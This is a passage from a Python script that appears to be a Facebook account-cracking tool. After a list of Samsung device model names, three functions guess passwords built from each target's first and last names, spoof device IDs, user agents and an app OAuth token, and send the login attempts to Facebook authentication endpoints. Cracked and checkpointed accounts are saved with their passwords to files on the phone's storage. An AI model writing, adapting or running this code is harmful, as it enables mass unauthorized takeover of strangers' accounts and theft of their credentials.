5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;92m [RASHID4] %s|\033[1;32mOK:-%s \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua = "[FBAN/MessengerLiteForiOS;FBAV/389.0.0.28.214;FBBV/426266477;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m Syed-OK '+ids+' | '+pas+'\033[1;35m')
                                        open('/sdcard/Syed-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\033[1;31m Syed-CP '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/Syed-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;92m [RASHID2] %s|\033[1;32mOK:-%s \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua = "[FBAN/MessengerLiteForiOS;FBAV/389.0.0.28.214;FBBV/426266477;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mRASHID-OK '+ids+' | '+pas+'\033[1;35m')
                                        open('/sdcard/Syed-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\033[1;31m RASHID-CP '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/RASHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RASHID-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;92m [RASHID1] %s|\033[1;32mOK:-%s \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua = "[FBAN/MessengerLiteForiOS;FBAV/389.0.0.28.214;FBBV/426266477;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':  'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RASHID-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m RASHID-OK '+uid+' | '+pas+'\033[1;35m')
                                                        open('/sdcard/Syed-.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;31mRASHID-CP '+uid+' | '+pas+'\033[1;35m')
                                                open('/sdcard/RASHID-CP.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                        



menu()
